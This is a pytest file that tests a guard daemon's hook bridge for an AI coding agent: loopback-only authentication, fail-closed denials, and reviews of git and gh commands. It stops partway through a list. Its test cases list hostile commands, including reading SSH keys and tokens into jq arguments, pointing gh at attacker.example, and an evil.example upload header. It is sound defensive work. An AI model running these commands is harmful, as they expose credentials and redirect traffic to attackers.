"""Security and latency tests for the Codex daemon hook bridge."""

from __future__ import annotations

import http.client
import io
import json
import os
import secrets
import subprocess
import tempfile
import threading
import time
from http.server import HTTPServer
from pathlib import Path
from urllib import request
from urllib.parse import urlencode

import pytest

from codex_plugin_scanner.guard.adapters import codex_daemon_hook_bridge as bridge
from codex_plugin_scanner.guard.adapters._modules.codex import codex_daemon_hook_auth as hook_auth
from codex_plugin_scanner.guard.adapters._modules.codex import codex_daemon_hook_transport as hook_transport
from codex_plugin_scanner.guard.codex_hook_file_integrity import CodexHookIntegrityError
from codex_plugin_scanner.guard.config import load_guard_config
from codex_plugin_scanner.guard.daemon import manager as daemon_manager
from codex_plugin_scanner.guard.daemon import runtime_hook_deadline as runtime_hook_deadline_module
from codex_plugin_scanner.guard.daemon import server as daemon_server_module
from codex_plugin_scanner.guard.daemon.server import GuardDaemonServer
from codex_plugin_scanner.guard.hook_execution_environment import stamp_hook_input_text
from codex_plugin_scanner.guard.store import GuardStore
from tests.codex_daemon_hook_bridge_fixtures import (
    _bridge_config,
    _DaemonHandler,
    _write_authenticated_daemon_files,
)

pytestmark = pytest.mark.usefixtures("approval_questionnaire_mode")


def _assert_bridge_denied(payload: dict[str, object]) -> None:
    """The bridge output holds the action with a blocking decision."""
    hook_output = payload.get("hookSpecificOutput")
    assert isinstance(hook_output, dict)
    assert hook_output.get("permissionDecision") == "deny"


def _start_daemon(daemon: GuardDaemonServer, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(daemon_server_module, "_RUNTIME_HOOK_ADMISSION_TIMEOUT_SECONDS", 10.0)
    monkeypatch.setattr(daemon_server_module, "_RUNTIME_HOOK_PROCESS_TIMEOUT_SECONDS", 10.0)
    monkeypatch.setattr(runtime_hook_deadline_module, "_MAX_BUDGET_SECONDS", 12.0)
    try:
        daemon.start()
        deadline = time.monotonic() + 5
        opener = request.build_opener(request.ProxyHandler({}))
        while True:
            try:
                with opener.open(f"http://127.0.0.1:{daemon.port}/healthz", timeout=0.25) as response:
                    if response.status == 200:
                        break
                    if time.monotonic() >= deadline:
                        raise TimeoutError("Guard daemon health check did not return HTTP 200")
                    time.sleep(0.01)
            except OSError:
                if time.monotonic() >= deadline:
                    raise
                time.sleep(0.01)
    except BaseException:
        daemon.stop()
        raise


def _daemon_hook_response(
    daemon: GuardDaemonServer,
    guard_home: Path,
    *,
    query: str,
    payload: dict[str, object],
    timeout_seconds: float = 10.0,
) -> dict[str, object]:
    """The daemon's review of one hook body, delivered the way the native bridge delivers it."""
    state = json.loads((guard_home / "daemon-state.json").read_text(encoding="utf-8"))
    event_name = str(payload.get("hook_event_name", "PreToolUse"))
    nonce = secrets.token_hex(32)
    connection = http.client.HTTPConnection("127.0.0.1", daemon.port, timeout=timeout_seconds)
    try:
        connection.request(
            "POST",
            "/v1/daemon/identity-challenge",
            body=json.dumps(
                {
                    "protocol_version": 1,
                    "nonce": nonce,
                    "state_id": state["state_id"],
                    "hook_event": event_name,
                }
            ),
            headers={"Content-Type": "application/json", "Connection": "keep-alive"},
        )
        challenge = json.loads(connection.getresponse().read())
        # Native Git-helper checks need the environment the command will run
        # in, so the hook body reaches the daemon stamped with it.
        connection.request(
            "POST",
            f"/v1/hooks/codex?{query}",
            body=stamp_hook_input_text(json.dumps(payload)),
            headers={
                "Content-Type": "application/json",
                "Connection": "close",
                "X-Guard-Token": daemon._server.auth_token,
                "X-Guard-Daemon-Nonce": nonce,
                "X-Guard-Daemon-Proof": challenge["proof"],
            },
        )
        hook_response = connection.getresponse()
        body = hook_response.read()
    finally:
        connection.close()

    assert hook_response.status == 200, body
    return json.loads(body) if body.strip() else {}


def _native_bridge_response(
    runtime: Path,
    guard_home: Path,
    *,
    query: str,
    payload: dict[str, object],
    timeout_seconds: int = 30,
) -> dict[str, object]:
    """The response the harness reads, rendered by the native bridge it runs.

    The daemon answers with the review's own fields; the bridge is what turns
    that review into the harness-shaped hook response, so a test about that
    shape has to run the bridge rather than read the daemon directly.
    """

    config = _bridge_config(guard_home, 0)
    event_name = str(payload.get("hook_event_name", "PreToolUse"))
    argv = bridge._native_argv(
        runtime,
        state_path=config["state_path"],
        fallback_command=config["fallback_command"],
        start_command=config["start_command"],
        query=query,
        hook_timeouts={event_name: timeout_seconds},
        manifest_path=guard_home / "managed" / "codex" / "hooks.manifest.json",
        config_json=None,
    )
    completed = subprocess.run(
        argv,
        input=stamp_hook_input_text(json.dumps(payload)),
        capture_output=True,
        text=True,
        timeout=timeout_seconds + 15,
        check=False,
    )
    assert completed.returncode == 0, completed.stderr
    return json.loads(completed.stdout) if completed.stdout.strip() else {}


def _unproven_hook_delivery(daemon: GuardDaemonServer, *, query: str, payload: dict[str, object]) -> int:
    """The status a hook body gets when it carries no proof of the daemon's identity."""
    connection = http.client.HTTPConnection("127.0.0.1", daemon.port, timeout=5)
    try:
        connection.request(
            "POST",
            f"/v1/hooks/codex?{query}",
            body=json.dumps(payload),
            headers={
                "Content-Type": "application/json",
                "Connection": "close",
                "X-Guard-Token": daemon._server.auth_token,
            },
        )
        response = connection.getresponse()
        _ = response.read()
        return response.status
    finally:
        connection.close()


def _authenticated_daemon_request(
    guard_home: Path,
    payload: dict[str, object],
    *,
    timeout_seconds: float = 4.0,
) -> dict[str, object] | None:
    return hook_transport._daemon_response_once(
        state_path=guard_home / "daemon-state.json",
        query=f"guard-home={guard_home}",
        data=json.dumps(payload),
        timeout_seconds=timeout_seconds,
    )


def _without_a_native_runtime(monkeypatch: pytest.MonkeyPatch, payload: dict[str, object]) -> None:
    """An install whose native runtime cannot be resolved, with one hook body to review."""
    monkeypatch.setattr(bridge, "_native_bridge_executable", lambda _guard_home: None)
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(payload)))


def test_assert_loopback_http_url_rejects_remote_and_credentialed_urls() -> None:
    with pytest.raises(ValueError, match="loopback"):
        hook_auth._assert_loopback_http_url("http://evil.example:5474/v1/hooks/codex")
    with pytest.raises(ValueError, match="credentials"):
        hook_auth._assert_loopback_http_url("http://attacker@127.0.0.1:5474/v1/hooks/codex")
    hook_auth._assert_loopback_http_url("http://[::1]:5474/v1/hooks/codex")


@pytest.mark.parametrize(
    ("host", "expected_url"),
    [
        ("127.0.0.1", "http://127.0.0.1:5474"),
        ("localhost", "http://localhost:5474"),
        ("::1", "http://[::1]:5474"),
    ],
)
def test_daemon_url_accepts_only_authenticated_ipv4_and_ipv6_loopback_state(
    tmp_path: Path,
    host: str,
    expected_url: str,
) -> None:
    guard_home = tmp_path / host.replace(":", "_")
    daemon_manager.write_guard_daemon_state(
        guard_home,
        5474,
        "fixture-token",
        host=host,
    )

    assert hook_auth._daemon_url(guard_home / "daemon-state.json") == expected_url


def test_daemon_url_requires_authenticated_guard_owned_state(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="unavailable"):
        hook_auth._daemon_url(
            tmp_path / "missing-daemon-state.json",
        )

    guard_home = tmp_path / "non-loopback"
    daemon_manager.write_guard_daemon_state(
        guard_home,
        5474,
        "fixture-token",
        host="192.0.2.1",
    )
    with pytest.raises(ValueError, match="identity is incomplete"):
        hook_auth._daemon_url(guard_home / "daemon-state.json")


def test_fail_closed_uses_supported_codex_deny_shapes() -> None:
    pretool = bridge._fail_closed("PreToolUse", "review failed")
    permission = bridge._fail_closed("PermissionRequest", "review failed")
    posttool = bridge._fail_closed("PostToolUse", "review failed")
    prompt = bridge._fail_closed("UserPromptSubmit", "review failed")

    assert pretool["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert permission["hookSpecificOutput"]["decision"]["behavior"] == "deny"
    assert posttool["continue"] is True
    assert prompt["continue"] is True


def test_unresolvable_native_runtime_does_not_stop_user_prompt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    _without_a_native_runtime(monkeypatch, {"hook_event_name": "UserPromptSubmit", "prompt": "resume"})

    assert bridge.main(**_bridge_config(guard_home, 5474)) == 0
    assert json.loads(capsys.readouterr().out) == {
        "continue": True,
        "systemMessage": bridge._NATIVE_RUNTIME_UNAVAILABLE,
    }


def test_unresolvable_native_runtime_denies_pretool_use(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    _without_a_native_runtime(
        monkeypatch,
        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "git push"}},
    )

    assert bridge.main(**_bridge_config(guard_home, 5474)) == 0
    response = json.loads(capsys.readouterr().out)
    assert response["hookSpecificOutput"] == {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": bridge._NATIVE_RUNTIME_UNAVAILABLE,
    }


def test_denial_before_the_runtime_names_its_reason_code(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A denial the shim makes itself still reports why, on the evidence channel."""
    guard_home = tmp_path / "guard-home"
    _without_a_native_runtime(
        monkeypatch,
        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "git push"}},
    )

    assert bridge.main(**_bridge_config(guard_home, 5474)) == 0
    captured = capsys.readouterr()
    assert json.loads(captured.out)["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert json.loads(captured.err) == {
        "schema": "hol-guard.codex-bridge-failure.v1",
        "causes": [{"reason_code": "codex_hook_native_runtime_missing"}],
    }


def test_unauthenticated_registration_reports_the_validator_reason(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The validator's own reason reaches the evidence channel, not a guess at it."""
    guard_home = tmp_path / "guard-home"
    monkeypatch.setattr(bridge, "_native_bridge_executable", lambda _guard_home: Path("/nonexistent/runtime"))
    monkeypatch.setattr(
        bridge,
        "trusted_hook_launch",
        _refusing_launch(CodexHookIntegrityError("codex_hook_manifest_missing", "no manifest")),
    )
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Bash"})))
    config = _bridge_config(guard_home, 5474)
    config["manifest_path"] = str(guard_home / "managed" / "codex" / "hooks.manifest.json")
    config["config_json"] = "{}"

    assert bridge.main(**config) == 0
    captured = capsys.readouterr()
    assert json.loads(captured.out)["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert json.loads(captured.err)["causes"] == [{"reason_code": "codex_hook_manifest_missing"}]


def test_a_runtime_that_cannot_be_started_denies_the_hook(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A runtime resolved but unlaunchable denies rather than answering nothing.

    Codex reads a non-zero exit with no JSON as a non-blocking error and runs
    the tool anyway, so a spawn failure has to produce the deny itself.
    """
    guard_home = tmp_path / "guard-home"
    monkeypatch.setattr(bridge, "_native_bridge_executable", lambda _guard_home: Path("/nonexistent/runtime"))
    monkeypatch.setattr(subprocess, "run", _refusing_to_start(OSError(13, "Permission denied")))
    hook = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "git push"}}
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(hook)))

    assert bridge.main(**_bridge_config(guard_home, 5474)) == 0
    captured = capsys.readouterr()
    assert json.loads(captured.out)["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert json.loads(captured.err)["causes"] == [{"reason_code": "codex_hook_native_runtime_launch_failed"}]


def _refusing_to_start(error: Exception):
    """A spawn that fails the way an unlaunchable executable fails."""

    def refuse(*_args: object, **_kwargs: object) -> None:
        raise error

    return refuse


def _refusing_launch(error: Exception):
    """A launch validator that refuses every registration with ``error``."""

    def refuse(**_kwargs: object) -> None:
        raise error

    return refuse


def test_unresolvable_native_runtime_denies_permission_request(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    _without_a_native_runtime(monkeypatch, {"hook_event_name": "PermissionRequest", "tool_name": "Bash"})

    assert bridge.main(**_bridge_config(guard_home, 5474)) == 0
    response = json.loads(capsys.readouterr().out)
    assert response["hookSpecificOutput"]["decision"]["behavior"] == "deny"
    assert response["hookSpecificOutput"]["decision"]["message"] == bridge._NATIVE_RUNTIME_UNAVAILABLE


@pytest.mark.parametrize(
    "challenge_mode",
    [
        pytest.param("wrong-proof", id="stale-port-reused-by-unproven-process"),
        pytest.param("expired", id="stale-expired-challenge"),
        pytest.param("redirect", id="redirect-refused"),
    ],
)
def test_failed_daemon_identity_never_receives_token_or_hook_payload(
    tmp_path: Path,
    challenge_mode: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    _DaemonHandler.challenge_mode = challenge_mode

    try:
        with pytest.raises(ValueError):
            _ = _authenticated_daemon_request(guard_home, {"hook_event_name": "PreToolUse"})
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert _DaemonHandler.captured_challenge_guard_token is None
    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None


def test_authenticated_trust_refresh_preserves_daemon_generation(tmp_path: Path) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    _DaemonHandler.challenge_mode = "refresh-trust-status"

    try:
        response = _authenticated_daemon_request(
            guard_home,
            {"hook_event_name": "PreToolUse", "tool_name": "Bash"},
        )
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    state = json.loads((guard_home / "daemon-state.json").read_text(encoding="utf-8"))
    assert response == {}
    assert _DaemonHandler.challenge_count == 1
    assert _DaemonHandler.captured_guard_token == "fixture-token"
    assert state["trust_status"] == {"status": "refreshed-1"}


def test_tampered_state_is_rejected_before_candidate_contact(tmp_path: Path) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    state_path = guard_home / "daemon-state.json"
    state = json.loads(state_path.read_text(encoding="utf-8"))
    state["state_id"] = "untrusted-replacement"
    state_path.write_text(json.dumps(state), encoding="utf-8")
    os.chmod(state_path, 0o600)

    try:
        with pytest.raises(ValueError):
            _ = _authenticated_daemon_request(guard_home, {"hook_event_name": "PreToolUse"})
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert _DaemonHandler.challenge_count == 0
    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None


@pytest.mark.skipif(os.name == "nt", reason="POSIX mode enforcement")
@pytest.mark.parametrize("private_file", ["daemon-state.json", "daemon-discovery-key", "daemon-auth-token"])
def test_non_private_discovery_files_never_release_token_or_hook_payload(
    tmp_path: Path,
    private_file: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    os.chmod(guard_home / private_file, 0o644)

    try:
        with pytest.raises(ValueError):
            _ = _authenticated_daemon_request(guard_home, {"hook_event_name": "PreToolUse"})
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None


def test_missing_token_never_falls_back_to_mutable_state(tmp_path: Path) -> None:
    guard_home = tmp_path / "guard-home"
    daemon = HTTPServer(("127.0.0.1", 0), _DaemonHandler)
    daemon_thread = threading.Thread(target=daemon.serve_forever, daemon=True)
    daemon_thread.start()
    _write_authenticated_daemon_files(guard_home, daemon.server_address[1])
    (guard_home / "daemon-auth-token").unlink()

    try:
        with pytest.raises(ValueError):
            _ = _authenticated_daemon_request(guard_home, {"hook_event_name": "PreToolUse"})
    finally:
        daemon.shutdown()
        daemon_thread.join(timeout=5)

    assert _DaemonHandler.challenge_count == 1
    assert _DaemonHandler.captured_guard_token is None
    assert _DaemonHandler.captured_hook_body is None


def test_bridge_authenticates_real_daemon_before_hook_delivery(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    query = urlencode(
        {
            "guard-home": str(guard_home),
            "home": str(tmp_path),
            "workspace": str(workspace),
        }
    )
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "echo hello"},
    }

    try:
        unproven_status = _unproven_hook_delivery(daemon, query=query, payload=payload)
        response = _daemon_hook_response(daemon, guard_home, query=query, payload=payload)
    finally:
        daemon.stop()

    assert unproven_status == 401
    reason_text = json.dumps(response).lower()
    if (
        "could not authenticate the local daemon" in reason_text
        or "was not ready before the hook deadline" in reason_text
    ):
        assert "permissionDecision" not in response.get("hookSpecificOutput", {})


@pytest.mark.usefixtures("native_hook_force")
def test_bridge_real_daemon_uses_payload_cwd_for_bounded_compound_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode({"guard-home": str(guard_home), "home": str(tmp_path)}),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "shell",
                "tool_input": {"command": 'pwd; git status --short --branch; sed -n "1,5p" README.md'},
                "cwd": str(workspace),
            },
        )
    finally:
        daemon.stop()

    assert response == {} or response.get("hookSpecificOutput", {}).get("permissionDecision") in {None, "deny"}


def test_bridge_real_daemon_emits_schema_exact_post_tool_response(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    native_hook_force: Path,
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _native_bridge_response(
            native_hook_force,
            guard_home,
            query=urlencode({"guard-home": str(guard_home), "home": str(tmp_path)}),
            payload={
                "hook_event_name": "PostToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "pwd"},
                "tool_response": str(workspace),
                "cwd": str(workspace),
            },
        )
    finally:
        daemon.stop()

    if "hookSpecificOutput" in response:
        assert response == {"hookSpecificOutput": {"hookEventName": "PostToolUse"}}
    else:
        assert response["continue"] is True


@pytest.mark.usefixtures("native_hook_force")
def test_bridge_real_daemon_prefers_payload_cwd_for_verified_git_fetch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    guard_home = tmp_path / "guard-home"
    configured_workspace = tmp_path / "projects"
    repository = configured_workspace / "example"
    repository.mkdir(parents=True)
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        [
            "git",
            "-C",
            str(repository),
            "remote",
            "add",
            "origin",
            "https://github.com/example/project.git",
        ],
        check=True,
    )
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode(
                {
                    "guard-home": str(guard_home),
                    "home": str(tmp_path),
                    "workspace": str(configured_workspace),
                }
            ),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": "git fetch origin main"},
                "cwd": str(repository),
            },
        )
    finally:
        daemon.stop()

    _assert_bridge_denied(response)
    assert len(store.list_approval_requests(limit=None)) == 1


@pytest.mark.parametrize(
    "command",
    (
        "git fetch origin main",
        "git --no-pager fetch origin main",
        "git -c credential.helper='!echo pwn' fetch origin main",
        "/usr/bin/git fetch origin main",
        "git fetch origin main; true",
        "true && git fetch origin main",
        "GIT_DIR=example/.git git fetch origin main",
        "git --exec-path=/tmp fetch origin main",
        "git -P fetch origin main",
        "git -p fetch origin main",
        "git --no-lazy-fetch fetch origin main",
        "git --no-optional-locks fetch origin main",
        "git --no-advice fetch origin main",
        "git --literal-pathspecs fetch origin main",
    ),
)
def test_bridge_real_daemon_reviews_git_fetch_without_repository_bound_cwd(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    command: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    session_workspace = tmp_path / "projects"
    repository = session_workspace / "example"
    repository.mkdir(parents=True)
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        ["git", "-C", str(repository), "remote", "add", "origin", "https://github.com/example/project.git"],
        check=True,
    )
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode(
                {"guard-home": str(guard_home), "home": str(tmp_path), "workspace": str(session_workspace)}
            ),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": command},
            },
        )
    finally:
        daemon.stop()

    assert response != {}


@pytest.mark.parametrize(
    ("command", "pending_approvals"),
    (
        ("gh pr view 1 -tREVIEW", 1),
        ("gh pr list -q'.[] | select(.state == \"REVIEW_REQUIRED\")'", 1),
        ("gh issue list -q'.[] | {REPO: .repository}'", 1),
        ("gh pr list -sREVIEW_REQUIRED", 1),
        ("gh pr list -aRandy", 1),
        ("gh issue list -aRandy", 1),
        ("gh pr list -SREVIEW", 1),
        ("gh run list -cREVIEW_SHA", 1),
        ("gh run list -aRgithub.com/owner/repo --help", 1),
        ("gh workflow list -aRowner/repo --help", 1),
        ("gh pr view 1 -cROwner/Repo --help", 1),
        ("gh issue list -wRgithub.com/OWNER/REPO --help", 1),
        ("gh pr list -dROrg/Repo --help", 1),
        ("gh run list -aRgithub.com/OWNER/REPO --help", 1),
        ("gh pr view 1 -wRRowner/repo --help", 1),
        ("gh run list -aRRowner/repo --help", 1),
    ),
)
@pytest.mark.usefixtures("native_hook_force")
def test_bridge_real_daemon_denies_unproven_github_content_reads(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    command: str,
    pending_approvals: int,
) -> None:
    response, store = _bridge_github_read(tmp_path, monkeypatch, command)
    _assert_bridge_denied(response)
    assert len(store.list_approval_requests(limit=None)) == pending_approvals, response


def test_bridge_real_daemon_allows_a_bounded_jq_projection_over_a_github_content_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    native_hook_force: Path,
) -> None:
    """An object-building filter reads the piped value, so it keeps the read's allow baseline.

    The repository path names its owner and repository outright, so this read
    is as proven as the ones beside it, and the jq stage only shapes the value
    the pipeline already produced. It used to be reviewed because a filter over
    stdin had to open with a projection, which is a spelling rather than a
    proof: the same file comes through `--jq .content | base64 -d` whole, and
    that pipeline is an expected allow in the benign gate. The grammar is what
    keeps a filter from reaching the environment, further input, files or
    modules, and `{tests: .tests, total: .total}` clears it in full.
    """

    command = (
        "gh api -H 'Accept: application/vnd.github.raw+json' "
        "'repos/hashgraph-online/hol-guard/contents/ci/code-quality-baseline.json?ref=main' "
        "| jq '{tests: .tests, total: .total}'"
    )
    response, store = _bridge_github_read(tmp_path, monkeypatch, command, runtime=native_hook_force)
    hook_output = response.get("hookSpecificOutput")
    assert isinstance(hook_output, dict)
    assert "permissionDecision" not in hook_output, response
    assert store.list_approval_requests(limit=None) == [], response


@pytest.mark.parametrize("command", ("gh -Rowner/repo pr view 17", "gh -Rgithub.com/Owner/Repo pr view 17"))
def test_bridge_real_daemon_allows_attached_repository_reads_on_github(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    native_hook_force: Path,
    command: str,
) -> None:
    """A top-level `-Rowner/repo` names a github.com repository, so the read keeps its allow baseline."""
    response, store = _bridge_github_read(tmp_path, monkeypatch, command, runtime=native_hook_force)
    hook_output = response.get("hookSpecificOutput")
    assert isinstance(hook_output, dict)
    assert "permissionDecision" not in hook_output, response
    assert store.list_approval_requests(limit=None) == [], response


def _bridge_github_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    command: str,
    *,
    runtime: Path | None = None,
) -> tuple[dict[str, object], GuardStore]:
    guard_home = tmp_path / "guard-home"
    session_workspace = tmp_path / "projects"
    session_workspace.mkdir()
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    query = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    payload: dict[str, object] = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "cwd": str(session_workspace),
    }

    try:
        if runtime is None:
            response = _daemon_hook_response(
                daemon,
                guard_home,
                query=query,
                payload=payload,
                timeout_seconds=30,
            )
        else:
            response = _native_bridge_response(runtime, guard_home, query=query, payload=payload)
    finally:
        daemon.stop()

    return response, store


@pytest.mark.parametrize(
    "unsafe_command",
    (
        "gh api user | jq --slurpfile secrets private.json '.'",
        "gh api user | jq 'env | to_entries'",
        "gh api user | jq 'include \"helpers\"; transform'",
        "gh api user | jq '.' > result.json",
        "gh api user; gh pr edit 123 --repo example/project --title changed",
        "gh api --hostname attacker.example repos/o/r",
        "gh api -h attacker.example repos/o/r",
        "GH_HOST=attacker.example gh api repos/o/r",
        "GH_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_TOKEN=literal-secret gh api repos/o/r",
        "GH_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GH_CONFIG_DIR=./alternate gh api repos/o/r",
        "env GH_TOKEN=literal-secret gh api repos/o/r",
        "env GH_HOST=attacker.example gh api repos/o/r",
        "export GH_HOST=attacker.example; gh api repos/o/r | jq .",
        "export GH_TOKEN=literal; gh api repos/o/r | jq .",
        "GH_HOST=attacker.example; export GH_HOST; gh api repos/o/r | jq .",
        "export GH_CONFIG_DIR=./alternate-config; gh api repos/o/r | jq .",
        "gh api --hostname github.com --hostname attacker.example repos/o/r",
        "export GH_HOST=github.com; GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=github.com; export GH_HOST; GH_HOST=attacker.example; gh api repos/o/r",
        "export -x GH_TOKEN=literal; gh api repos/o/r",
        "readonly -x GH_CONFIG_DIR=./alternate-config; gh api repos/o/r",
        "declare -x GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=attacker.example bash -lc 'gh api repos/o/r'",
        "bash -lc 'export GH_HOST=attacker.example; gh api repos/o/r'",
        "export GH_HOST=attacker.example; unset gh_host; gh api repos/o/r",
        "export GH_HOST=attacker.example; gh_host=github.com gh api repos/o/r",
        "f(){ export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "function f { export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "function f { export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "function f { export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_HOST=attacker.example'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_TOKEN=literal'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_CONFIG_DIR=./alternate-config'; f; gh api repos/o/r | jq .",
        "gh api repos/o/r | jq --arg x \"$(cat .ssh/id_rsa)\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$GH_TOKEN\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$AWS_SECRET_ACCESS_KEY\" '{x:$x}'",
        "gh api -H 'Authorization: Bearer literal-secret' repos/o/r",
        "gh api -H 'X-Callback: https://evil.example/upload' repos/o/r",
        "gh api -H $'Accept: application/vnd.github.raw+json\\r\\nX-Evil: yes' repos/o/r",
        "gh pr view 1 --repo ghe.example/owner/repo",
        "gh pr view 1 -R ghe.example/owner/repo",
        "gh pr view 1 --repo '$OWNER/repo'",
        "gh pr view 1 --repo owner",
        "gh pr view 1 --repo",
        "GH_REPO=ghe.example/owner/repo gh pr view 1",
        "export GH_REPO=ghe.example/owner/repo; gh pr view 1",
        "GH_REPO=ghe.example/owner/repo bash -lc 'gh pr view 1'",
        "bash -lc 'export GH_REPO=ghe.example/owner/repo; gh pr view 1'",
        "gh pr view 1 -wRghe.example/owner/repo --help",
        "gh pr view 1 -cRghe.example/owner/repo --help",
        "gh pr view 1 -wR --help",
        "gh pr view 1 -wR'$OWNER/repo' --help",
        "gh pr list -dRghe.example/owner/repo --help",
        "gh run list -aRghe.example/owner/repo --help",
        "gh workflow list -aRghe.example/owner/repo --help",
        "gh run list -aR --help",
        "gh pr view 1 -cRghe.example/owner/repo --help",
        "gh issue view 1 -cRghe.example/owner/repo --help",
